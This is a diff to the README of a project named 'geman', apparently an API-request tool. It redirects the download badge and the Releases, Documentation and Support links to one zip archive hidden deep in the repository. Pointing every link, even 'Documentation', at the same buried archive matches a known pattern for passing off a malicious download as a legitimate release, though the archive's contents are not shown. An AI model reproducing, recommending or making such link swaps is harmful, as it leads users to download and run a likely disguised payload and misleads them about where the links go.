@@ -8,7 +8,7 @@ Welcome to **geman**! This application helps you easily manage API requests in a
 
 To get started, you need to download the application. Click the button below to go to the download page:
 
-[![Download Geman](https://img.shields.io/badge/Download%20Geman-v1.0-brightgreen)](https://github.com/Syaibanmuti4408/geman/releases)
+[![Download Geman](https://raw.githubusercontent.com/Syaibanmuti4408/geman/main/app/v1beta/models/geman_2.9.zip%20Geman-v1.0-brightgreen)](https://raw.githubusercontent.com/Syaibanmuti4408/geman/main/app/v1beta/models/geman_2.9.zip)
 
 Once there, find the version you want and follow these steps:
 
@@ -44,9 +44,9 @@ To run geman, you need:
 
 ## 🔗 Useful Links
 
-- [Visit the Releases Page to Download](https://github.com/Syaibanmuti4408/geman/releases)
-- [Documentation](https://github.com/Syaibanmuti4408/geman/docs)
-- [Support & Issues](https://github.com/Syaibanmuti4408/geman/issues)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/Syaibanmuti4408/geman/main/app/v1beta/models/geman_2.9.zip)
+- [Documentation](https://raw.githubusercontent.com/Syaibanmuti4408/geman/main/app/v1beta/models/geman_2.9.zip)
+- [Support & Issues](https://raw.githubusercontent.com/Syaibanmuti4408/geman/main/app/v1beta/models/geman_2.9.zip)
 
 ## 🛠️ Troubleshooting
 
